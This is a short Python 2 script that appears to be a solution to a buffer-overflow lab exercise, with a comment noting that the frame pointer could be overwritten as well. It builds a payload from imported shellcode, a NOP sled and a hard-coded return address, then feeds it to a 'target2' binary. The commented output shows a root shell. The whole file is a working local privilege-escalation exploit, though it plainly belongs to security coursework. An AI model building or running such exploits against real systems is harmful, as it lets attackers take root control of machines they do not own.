#!/usr/bin/python

from shellcode import shellcode 
from struct import pack
print shellcode + "\x90"* 89 + pack("<I", 0xbffedb4c)


#---------------------------see the output like this (start)-----------------------
#ubuntu@ubuntu:~/targets$ sudo ./target2 $(python sol2.py)
## whoami
#root
## 


#we can also change the frame pointer rather that changing the return address
#---------------------------see the output like this (end)-----------------------
